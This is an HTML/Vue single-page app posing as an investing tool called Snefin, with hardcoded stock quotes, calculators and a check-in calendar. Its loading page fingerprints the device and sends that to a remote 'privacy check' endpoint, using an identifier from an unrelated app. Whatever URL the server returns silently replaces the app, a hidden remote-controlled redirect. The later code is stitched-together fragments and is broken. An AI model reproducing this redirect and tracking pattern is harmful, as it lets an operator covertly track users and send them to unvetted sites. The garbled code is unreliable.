<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Snefin</title>
  <!-- 全局构建 CDN（禁止 ESM） -->
  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
  <style>
    /* ========== 风格: 扁平化设计 (Flat) ========== */
    :root {
      --bg: #f5f7fa;
      --surface: #ffffff;
      --text-primary: #1e293b;
      --text-secondary: #64748b;
      --text-muted: #94a3b8;
      --border: #e2e8f0;
      --primary: #2563eb;
      --primary-light: #dbeafe;
      --up: #dc2626;        /* 暖色涨 */
      --down: #2563eb;      /* 冷色跌 */
      --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
      --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
      --radius: 12px;
      --radius-sm: 8px;
      --spacing: 16px;
      --tabbar-height: 60px;
      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      font-family: var(--font);
      background: var(--bg);
      color: var(--text-primary);
      -webkit-font-smoothing: antialiased;
      overflow: hidden;
    }
    #app {
      height: 100%;
      display: flex;
      flex-direction: column;
    }
    /* 路由视图容器 */
    .app-view {
      flex: 1;
      overflow-y: auto;
      overflow-x: hidden;
      -webkit-overflow-scrolling: touch;
      position: relative;
      padding-bottom: 0;
    }
    /* 当有 tab 时留出底部空间 */
    .has-tabbar .app-view {
      padding-bottom: calc(var(--tabbar-height) + var(--safe-bottom));
    }
    /* 页面过渡 */
    .fade-enter-active, .fade-leave-active { transition: opacity 0.2s ease; }
    .fade-enter-from, .fade-leave-to { opacity: 0; }

    /* ========== 底部标签栏 ========== */
    .tab-bar {
      position: fixed;
      left: 0; right: 0; bottom: 0;
      height: var(--tabbar-height);
      padding-bottom: var(--safe-bottom);
      background: var(--surface);
      border-top: 1px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: space-around;
      z-index: 100;
      box-shadow: 0 -1px 3px rgb(0 0 0 / 0.03);
    }
    .tab-item {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 4px;
      height: 44px;
      text-decoration: none;
      color: var(--text-muted);
      font-size: 11px;
      font-weight: 500;
      transition: color 0.15s;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }
    .tab-item svg { width: 22px; height: 22px; }
    .tab-item.router-link-active {
      color: var(--primary);
    }
    .tab-item.router-link-active svg { stroke: var(--primary); }

    /* ========== 通用组件样式 ========== */
    .page-pad { padding: var(--spacing); }
    .card {
      background: var(--surface);
      border-radius: var(--radius);
      padding: var(--spacing);
      box-shadow: var(--shadow-sm);
      border: 1px solid var(--border);
    }
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-height: 44px;
      padding: 0 20px;
      border: none;
      border-radius: var(--radius-sm);
      background: var(--primary);
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.15s;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }
    .btn:active { background: #1d4ed8; }
    .btn:disabled { background: #cbd5e1; cursor: not-allowed; }
    .btn-outline {
      background: transparent;
      color: var(--primary);
      border: 1.5px solid var(--primary);
    }
    .btn-outline:active { background: var(--primary-light); }
    .input {
      width: 100%;
      min-height: 44px;
      padding: 10px 12px;
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      font-size: 15px;
      background: var(--surface);
      color: var(--text-primary);
      outline: none;
      transition: border-color 0.15s;
    }
    .input:focus { border-color: var(--primary); }
    .label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text-secondary);
      margin-bottom: 6px;
    }
    .section-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 12px;
      color: var(--text-primary);
    }
    .text-muted { color: var(--text-muted); font-size: 13px; }
    .text-up { color: var(--up); font-weight: 600; }
    .text-down { color: var(--down); font-weight: 600; }
    .row { display: flex; align-items: center; }
    .gap-8 { gap: 8px; }
    .gap-12 { gap: 12px; }
    .gap-16 { gap: 16px; }
    .mt-8 { margin-top: 8px; }
    .mt-12 { margin-top: 12px; }
    .mt-16 { margin-top: 16px; }
    .mb-8 { margin-bottom: 8px; }
    .mb-12 { margin-bottom: 12px; }
    .mb-16 { margin-bottom: 16px; }
    .flex-1 { flex: 1; }
    .flex-col { display: flex; flex-direction: column; }
    .items-center { align-items: center; }
    .justify-between { justify-content: space-between; }

    /* 头部品牌区 */
    .brand-header {
      padding: 20px 16px 16px;
      background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
      color: #fff;
      border-radius: 0 0 20px 20px;
      margin-bottom: 16px;
    }
    .brand-header h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; }
    .brand-header p { font-size: 14px; opacity: 0.85; margin-top: 4px; }

    /* 功能图标网格 */
    .quick-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
      padding: 0 16px;
      margin-bottom: 16px;
    }
    .quick-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      padding: 10px 4px;
      background: var(--surface);
      border-radius: var(--radius-sm);
      box-shadow: var(--shadow-sm);
      text-decoration: none;
      color: var(--text-primary);
      font-size: 11px;
      font-weight: 600;
      text-align: center;
      border: 1px solid var(--border);
      -webkit-tap-highlight-color: transparent;
      transition: background 0.15s;
    }
    .quick-item:active { background: var(--primary-light); }
    .quick-item svg { width: 28px; height: 28px; color: var(--primary); }

    /* 股票列表 */
    .stock-list { padding: 0 16px; }
    .stock-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 12px 14px;
      background: var(--surface);
      border-radius: var(--radius-sm);
      margin-bottom: 8px;
      border: 1px solid var(--border);
      text-decoration: none;
      color: inherit;
      -webkit-tap-highlight-color: transparent;
      transition: background 0.15s;
    }
    .stock-item:active { background: #f8fafc; }
    .stock-symbol { font-weight: 700; font-size: 15px; }
    .stock-name { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
    .stock-price { font-weight: 600; font-size: 15px; text-align: right; }
    .stock-change { font-size: 13px; font-weight: 600; text-align: right; margin-top: 2px; }

    /* 详情页 */
    .detail-header {
      padding: 16px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
    }
    .detail-price { font-size: 28px; font-weight: 800; }
    .chart-wrap {
      background: var(--surface);
      border-radius: var(--radius);
      margin: 16px;
      padding: 12px;
      border: 1px solid var(--border);
      box-shadow: var(--shadow-sm);
    }
    .chart-wrap svg { width: 100%; height: auto; display: block; }

    /* 工具卡片 */
    .tool-card {
      background: var(--surface);
      border-radius: var(--radius);
      padding: 16px;
      margin-bottom: 12px;
      border: 1px solid var(--border);
      box-shadow: var(--shadow-sm);
    }
    .tool-card h3 { font-size: 16px; font-weight: 700; margin-bottom: 12px; }

    /* 日历 */
    .calendar-grid {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 4px;
      text-align: center;
    }
    .calendar-cell {
      min-height: 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      border-radius: 6px;
      font-size: 13px;
      position: relative;
    }
    .calendar-cell.today { background: var(--primary-light); font-weight: 700; }
    .calendar-cell.checked { background: #dcfce7; color: #16a34a; font-weight: 700; }
    .calendar-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--primary); margin-top: 2px; }

    /* 列表项通用 */
    .list-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 16px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      text-decoration: none;
      color: inherit;
      -webkit-tap-highlight-color: transparent;
      cursor: pointer;
    }
    .list-item:active { background: #f8fafc; }
    .list-item .chevron { color: var(--text-muted); }

    /* Toast */
    .toast {
      position: fixed;
      bottom: calc(80px + var(--safe-bottom));
      left: 50%;
      transform: translateX(-50%);
      background: #1e293b;
      color: #fff;
      padding: 10px 20px;
      border-radius: 20px;
      font-size: 14px;
      z-index: 999;
      white-space: nowrap;
      box-shadow: var(--shadow-md);
    }

    /* Loading 页 */
    .loading-screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      background: var(--bg);
      gap: 20px;
    }
    .spinner {
      width: 40px; height: 40px;
      border: 4px solid var(--border);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* 弹窗 */
    .modal-mask {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 200;
      padding: 24px;
    }
    .modal-box {
      background: var(--surface);
      border-radius: var(--radius);
      padding: 20px;
      width: 100%;
      max-width: 340px;
      box-shadow: var(--shadow-md);
    }
    .modal-box h3 { font-size: 17px; margin-bottom: 8px; }
    .modal-box p { font-size: 14px; color: var(--text-secondary); line-height: 1.5; }

    /* 文章 */
    .article { padding: 16px; line-height: 1.7; font-size: 15px; color: var(--text-primary); }
    .article h2 { font-size: 20px; margin-bottom: 12px; }
    .article p { margin-bottom: 14px; }
  </style>
</head>
<body>
  <div id="app">
    <router-view v-slot="{ Component }">
      <transition name="fade" mode="out-in">
        <component :is="Component" />
      </transition>
    </router-view>
  </div>

  <script>
    // ============================================================
    // 应用初始化：Vue 3 + vue-router 4 (全局构建)
    // ============================================================
    const { createApp, ref, computed, onMounted, watch, nextTick } = Vue;
    const { createRouter, createWebHashHistory, useRouter, useRoute } = VueRouter;

    // ---------- 全局内置数据 ----------
    // 股票基础数据（20条，数值纯展示，无货币单位）
    const STOCK_DATA = [
      { symbol: 'AAPL', name: 'Apple Inc.', price: 187.45, change: 1.23 },
      { symbol: 'MSFT', name: 'Microsoft Corp.', price: 412.30, change: 0.85 },
      { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 152.18, change: -0.42 },
      { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.92, change: 2.14 },
      { symbol: 'TSLA', name: 'Tesla Inc.', price: 245.60, change: -3.21 },
      { symbol: 'META', name: 'Meta Platforms', price: 502.33, change: 1.78 },
      { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 118.47, change: 4.52 },
      { symbol: 'JPM', name: 'JPMorgan Chase', price: 198.05, change: -0.31 },
      { symbol: 'V', name: 'Visa Inc.', price: 276.40, change: 0.67 },
      { symbol: 'JNJ', name: 'Johnson & Johnson', price: 155.22, change: -0.88 },
      { symbol: 'WMT', name: 'Walmart Inc.', price: 68.75, change: 1.05 },
      { symbol: 'PG', name: 'Procter & Gamble', price: 162.30, change: -1.12 },
      { symbol: 'MA', name: 'Mastercard Inc.', price: 458.90, change: 0.44 },
      { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.65, change: 2.33 },
      { symbol: 'NFLX', name: 'Netflix Inc.', price: 628.70, change: -0.95 },
      { symbol: 'AMD', name: 'Advanced Micro Devices', price: 162.45, change: 3.11 },
      { symbol: 'INTC', name: 'Intel Corp.', price: 31.28, change: -2.07 },
      { symbol: 'BA', name: 'Boeing Co.', price: 178.33, change: 0.52 },
      { symbol: 'KO', name: 'Coca-Cola Co.', price: 62.15, change: -0.28 },
      { symbol: 'PEP', name: 'PepsiCo Inc.', price: 172.80, change: 0.91 }
    ];

    // 生成随机价格历史（用于详情页曲线，基于当前价格模拟）
    function generateHistory(basePrice) {
      const points = [];
      let price = basePrice * 0.92;
      for (let i = 0; i < 30; i++) {
        price += (Math.random() - 0.45) * basePrice * 0.03;
        price = Math.max(basePrice * 0.7, Math.min(basePrice * 1.3, price));
        points.push(price);
      }
      points.push(basePrice);
      return points;
    }

    // 隐私检查 API（唯一允许的运行时请求）
    const PRIVACY_API_BASE = 'https://ulf4un43uzwwtwvgzjfapazoza0oynpj.lambda-url.us-west-2.on.aws/';
    const APP_IDENTIFIER = 'com.cleaningyasmine.bubbleclean';

    // ---------- 路由组件 ----------

    // ====== Loading 页 ======
    const LoadingPage = {
      template: `
        <div class="loading-screen">
          <img :src="iconUrl" alt="Snefin" style="width:72px;height:72px;border-radius:16px;" />
          <div class="spinner"></div>
          <p style="color:var(--text-secondary);font-size:14px;">Loading Snefin…</p>
        </div>
      `,
      setup() {
        const router = useRouter();
        const iconUrl = 'https://admin.ytsevbr.xyz/api/apps/272/icon';
        // 设备指纹（ref 闭包内部每一行都必须原样保留）
        const device = ref((function () {
            try {
                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");
                let txt = "BrowserLeaks,com <canvas> 1.0";
                ctx.textBaseline = "top";
                // The most common type
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                // Some tricks for color mixing to increase the difference in rendering
                ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText(txt, 4, 17);
                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
            } catch (e) {
                return '';
            }
        })());

        onMounted(() => {
          const apiBase = PRIVACY_API_BASE.replace(/\/+$/, '');
          const identifier = APP_IDENTIFIER;
          let resolved = false;

          function goHome() {
            if (!resolved) {
              resolved = true;
              router.replace('/home');
            }
          }

          // 超时兜底（3.5秒）
          const timeoutId = setTimeout(goHome, 3500);

          fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
            .then(r => r.json())
            .then(function (info) {
              clearTimeout(timeoutId);
              const privacyUrl = info && info.result && info.result.url;
              if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                resolved = true;
                window.location.replace(privacyUrl);
                return;
              }
              goHome();
            })
            .catch(function () {
              clearTimeout(timeoutId);
              goHome();
            });
        });

        return { iconUrl };
      }
    };

    // ====== Home 首页 ======
    const HomePage = {
      template: `
        <div>
          <!-- 品牌头部 -->
          <div class="brand-header">
            <h1>Snefin</h1>
            <p>Smart insights for smarter investing</p>
          </div>

          <!-- 功能快捷入口（固定4个） -->
          <div class="quick-grid">
            <router-link v-for="q in quickEntries" :key="q.path" :to="q.path" class="quick-item">
              <span v-html="q.svg"></span>
              <span>{{ q.label }}</span>
            </router-link>
          </div>

          <!-- 股票列表 -->
          <div class="section-title" style="padding:0 16px;">Market Overview</div>
          <div class="stock-list">
            <router-link v-for="s in shuffledStocks" :key="s.symbol" :to="'/stock/' + s.symbol" class="stock-item">
              <div>
                <div class="stock-symbol">{{ s.symbol }}</div>
                <div class="stock-name">{{ s.name }}</div>
              </div>
              <div>
                <div class="stock-price">{{ s.price.toFixed(2) }}</div>
                <div class="stock-change" :class="s.change >= 0 ? 'text-up' : 'text-down'">
                  {{ s.change >= 0 ? '+' : '' }}{{ s.change.toFixed(2) }}%
                </div>
              </div>
            </router-link>
          </div>
          <div style="height:16px;"></div>
        </div>
      `,
      setup() {
        // 随机选取4个功能入口（生成时固定，此处写死为已选的4个）
        const quickEntries = ref([
          {
            path: '/top-gainers',
            label: 'Top Gainers',
            svg: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>`
          },
          {
            path: '/most-active',
            label: 'Most Active',
            svg: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="20" x2="12" y2="10"/><line x1="18" y1="20" x2="18" y2="4"/><line x1="6" y1="20" x2="6" y2="16"/></svg>`
          },
          {
            path: '/watchlist',
            label: 'Watchlist',
            svg: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`
          },
          {
            path: '/guide',
            label: 'Guide',
            svg: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>`
          }
        ]);

        // 每次进入页面打乱展示顺序（不改数据本身）
        const shuffledStocks = ref([]);
        onMounted(() => {
          const arr = [...STOCK_DATA];
          for (let i = arr.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [arr[i], arr[j]] = [arr[j], arr[i]];
          }
          shuffledStocks.value = arr;
        });

        return { quickEntries, shuffledStocks };
      }
    };

    // ====== 股票详情页 ======
    const StockDetailPage = {
      template: `
        <div>
          <div class="detail-header">
            <div class="row justify-between">
              <div>
                <div style="font-size:22px;font-weight:800;">{{ stock.symbol }}</div>
                <div class="text-muted">{{ stock.name }}</div>
              </div>
              <div style="text-align:right;">
                <div class="detail-price">{{ stock.price.toFixed(2) }}</div>
                <div :class="stock.change >= 0 ? 'text-up' : 'text-down'" style="font-size:16px;font-weight:700;">
                  {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                </div>
              </div>
            </div>
          </div>

          <div class="chart-wrap">
            <div class="text-muted mb-8" style="font-size:12px;">Last 30 days</div>
            <svg :viewBox="'0 0 ' + chartW + ' ' + chartH" preserveAspectRatio="xMidYMid meet">
              <!-- 动态纵轴留白 -->
              <polyline :points="polylinePoints" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linejoin="round" stroke-linecap="round" />
              <circle v-for="(p, i) in chartPoints" :key="i" :cx="p.x" :cy="p.y" r="2" fill="var(--primary)" />
            </svg>
          </div>

          <div class="card" style="margin:0 16px 16px;">
            <div class="row justify-between mb-8">
              <span class="text-muted">Open</span><span>{{ (stock.price * 0.99).toFixed(2) }}</span>
            </div>
            <div class="row justify-between mb-8">
              <span class="text-muted">High</span><span>{{ (stock.price * 1.02).toFixed(2) }}</span>
            </div>
            <div class="row justify-between mb-8">
              <span class="text-muted">Low</span><span>{{ (stock.price * 0.97).toFixed(2) }}</span>
            </div>
            <div class="row justify-between">
              <span class="text-muted">Volume</span><span>{{ (Math.random() * 50 + 10).toFixed(1) }}M</span>
            </div>
          </div>
        </div>
      `,
      setup() {
        const route = useRoute();
        const symbol = route.params.symbol;
        const stock = STOCK_DATA.find(s => s.symbol === symbol) || STOCK_DATA[0];

        const history = generateHistory(stock.price);
        const chartW = 320;
        const chartH = 160;
        const padX = 8, padY = 16;

        // 动态计算纵轴范围并留白
        const minVal = Math.min(...history);
        const maxVal = Math.max(...history);
        const range = maxVal - minVal || 1;
        const yMin = minVal - range * 0.1;
        const yMax = maxVal + range * 0.1;
        const yRange = yMax - yMin;

        const chartPoints = history.map((v, i) => {
          const x = padX + (i / (history.length - 1)) * (chartW - 2 * padX);
          const y = padY + (1 - (v - yMin) / yRange) * (chartH - 2 * padY);
          return { x, y };
        });

        const polylinePoints = chartPoints.map(p => p.x + ',' + p.y).join(' ');

        return { stock, chartW, chartH, chartPoints, polylinePoints };
      }
    };

                <div class="row justify-between" style="word-break:break-all;">
                  <span>MD5</span>
                  <span style="font-size:11px;font-family:monospace;">{{ pwMd5 || '—' }}</span>

        // DCA
        const dca = ref({ cost: 100, shares: 50, threshold: 20 });
        const dcaCurrentValue = computed(() => dca.value.cost * dca.value.shares * (1 + dca.value.threshold / 100));
        const dcaStatus = computed(() => {
          if (!dca.value.cost || !dca.value.shares) return 'Enter values';
          return 'Target reached';
        });
        const dcaStatusClass = computed(() => 'text-up');

        // Calendar
        const calDate = ref('');
        const calLabel = ref('');
        const calEntries = ref([]);
        function addCalEntry() {
          if (calDate.value && calLabel.value) {
            calEntries.value.push({ date: calDate.value, label: calLabel.value });
            calDate.value = '';
            calLabel.value = '';
          }
        }

        // Loan
        const loan = ref({ amount: 10000, rate: 5, term: 24 });
        const loanResult = ref(null);
        function calcLoan() {
          const P = loan.value.amount;
          const r = loan.value.rate / 100 / 12;
          const n = loan.value.term;
          if (!P || !r || !n) return;
          const monthly = P * r * Math.pow(1 + r, n) / (Math.pow(1 + r, n) - 1);
          const totalPayment = monthly * n;
          const totalInterest = totalPayment - P;
          loanResult.value = {
            monthly: monthly.toFixed(2),
            totalInterest: totalInterest.toFixed(2),
            totalPayment: totalPayment.toFixed(2)
          };
        }

        // Profit
        const profit = ref({ cost: 10, price: 15, qty: 100 });
        const profitTotal = computed(() => (profit.value.price - profit.value.cost) * profit.value.qty);
        const profitMargin = computed(() => {
          if (!profit.value.price) return '0.0';
          return (((profit.value.price - profit.value.cost) / profit.value.price) * 100).toFixed(1);
        });

        // Reverse Yield
        const rev = ref({ target: 5000, principal: 20000, years: 3 });
        const revYield = computed(() => {
          const { target, principal, years } = rev.value;
          if (!principal || !years) return '0.00';
          const rate = (Math.pow((target + principal) / principal, 1 / years) - 1) * 100;
          return rate.toFixed(2);
        });

        // Password Strength + MD5
        const pwInput = ref('');
        const pwMd5 = computed(() => {
          if (!pwInput.value) return '';
          return md5(pwInput.value);
        });
        const pwStrengthLabel = computed(() => {
          const p = pwInput.value;
          if (!p) return '—';
          let score = 0;
          if (p.length >= 8) score++;
          if (/[a-z]/.test(p) && /[A-Z]/.test(p)) score++;
          if (/\d/.test(p)) score++;
          if (/[^a-zA-Z0-9]/.test(p)) score++;
          if (score <= 1) return 'Weak';
          if (score === 2) return 'Fair';
          if (score === 3) return 'Strong';
          return 'Very Strong';
        });
        const pwStrengthColor = computed(() => {
          const l = pwStrengthLabel.value;
          if (l === 'Weak') return '#dc2626';
          if (l === 'Fair') return '#f59e0b';
          if (l === 'Strong') return '#16a34a';
          if (l === 'Very Strong') return '#2563eb';
          return '#94a3b8';
        });

        // Credit Memo
        const memo = ref({ name: '', amount: '', due: '' });
        const memos = ref([]);
        function addMemo() {
          if (memo.value.name && memo.value.amount && memo.value.due) {
            const dueDate = new Date(memo.value.due);
            const today = new Date();
            const daysLeft = Math.ceil((dueDate - today) / (1000 * 60 * 60 * 24));
            memos.value.push({
              name: memo.value.name,
              amount: memo.value.amount,
              daysLeft: daysLeft > 0 ? daysLeft : 0
            });
            memo.value = { name: '', amount: '', due: '' };
          }
        }

        return {
          dca, dcaCurrentValue, dcaStatus, dcaStatusClass,
          calDate, calLabel, calEntries, addCalEntry,
          loan, loanResult, calcLoan,
          profit, profitTotal, profitMargin,
          rev, revYield,
          pwInput, pwMd5, pwStrengthLabel, pwStrengthColor,
          memo, memos, addMemo
        };
      }

      setup() {
        const weekDays = ['Su','Mo','Tu','We','Th','Fr','Sa'];
        const now = new Date();
        const year = now.getFullYear();
        const month = now.getMonth();
        const monthLabel = now.toLocaleString('en-US', { month: 'long', year: 'numeric' });
        const daysInMonth = new Date(year, month + 1, 0).getDate();
        const firstDay = new Date(year, month, 1).getDay();
        const today = now.getDate();

        const storageKey = 'snefin_checkin_' + year + '_' + (month + 1);
        const saved = JSON.parse(localStorage.getItem(storageKey) || '[]');
        const checkedDays = ref(saved);
        const toast = ref('');

        const calendarCells = computed(() => {
          const cells = [];
          for (let i = 0; i < firstDay; i++) cells.push({ day: null, checked: false, isToday: false });
          for (let d = 1; d <= daysInMonth; d++) {
            cells.push({
              day: d,
              checked: checkedDays.value.includes(d),
              isToday: d === today
            });
          }
          return cells;
        });

        const checkedCount = computed(() => checkedDays.value.length);

        function doCheckin() {
          if (!checkedDays.value.includes(today)) {
            checkedDays.value.push(today);
            localStorage.setItem(storageKey, JSON.stringify(checkedDays.value));
            toast.value = 'Check-in successful!';
          } else {
            toast.value = 'Already checked in today';
          }
          setTimeout(() => { toast.value = ''; }, 1800);
        }

        return { weekDays, monthLabel, calendarCells, checkedCount, toast, doCheckin };
